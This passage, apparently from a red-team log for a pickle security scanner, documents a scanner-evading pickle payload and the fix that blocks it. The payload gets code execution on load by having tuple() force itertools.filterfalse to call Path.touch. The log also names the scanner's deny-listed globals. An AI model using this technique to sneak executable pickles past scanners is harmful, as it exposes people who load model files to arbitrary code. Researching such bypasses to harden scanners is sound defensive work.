@@ -924,3 +924,95 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add iterable-flow analysis or broader string
 scanning.
+
+## Turn 25 - `itertools.filterfalse` forced-iteration call gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+marker = Path("/tmp/ma_itertools_filterfalse_tuple_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("builtins"),
+        s("tuple"),
+        b"\x93",
+        s("itertools"),
+        s("filterfalse"),
+        b"\x93",
+        s("pathlib"),
+        s("Path.touch"),
+        b"\x93",
+        b"]",
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_itertools_filterfalse_tuple_marker"),
+        b"tRa",
+        b"\x86R",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
+  `notices=[]`
+- Unpickle result: creates `/tmp/ma_itertools_filterfalse_tuple_marker` and
+  returns `(PosixPath("/tmp/ma_itertools_filterfalse_tuple_marker"),)`
+- RCE mechanism: the pickle constructs
+  `itertools.filterfalse(pathlib.Path.touch, [marker])`, then immediately
+  calls `tuple(...)` on that filterfalse object. `filterfalse()` stores an
+  attacker-selected predicate callable and iterable inputs, while `tuple()`
+  forces iteration during unpickling, invoking the predicate with
+  attacker-controlled arguments. `Path.touch()` returns `None`, so
+  `filterfalse` treats the predicate result as false and yields the original
+  marker object after the side effect.
+
+Why the scanner missed it:
+
+- `itertools.filterfalse` is absent from `DANGEROUS_GLOBALS`; only
+  `itertools.dropwhile`, `itertools.starmap`, and `itertools.takewhile` are
+  currently listed.
+- The payload uses only currently clean globals: `builtins.tuple`,
+  `itertools.filterfalse`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is another lazy arbitrary-call sink that can be forced
+by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
+entry for `("itertools", "filterfalse")`, plus a manual-pickle oracle
+regression that proves scan-time detection before unpickle-time marker
+creation.
+
+## Turn 26 - Block `itertools.filterfalse`
+
+Blocking plan:
+
+- Add `("itertools", "filterfalse")` to the sorted Rust `DANGEROUS_GLOBALS`
+  table. `tuple` stays allowed because the arbitrary-call sink is
+  `filterfalse`; `tuple` only forces iteration.
+- Add portable policy coverage for raw `GLOBAL itertools filterfalse`
+  reductions.
+- Add a CPython oracle regression that manually builds
+  `tuple(itertools.filterfalse(pathlib.Path.touch, [marker]))`, verifies
+  scanner detection, then verifies the marker file appears only during
+  unpickle.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add iterable-flow analysis or broader string
+scanning.
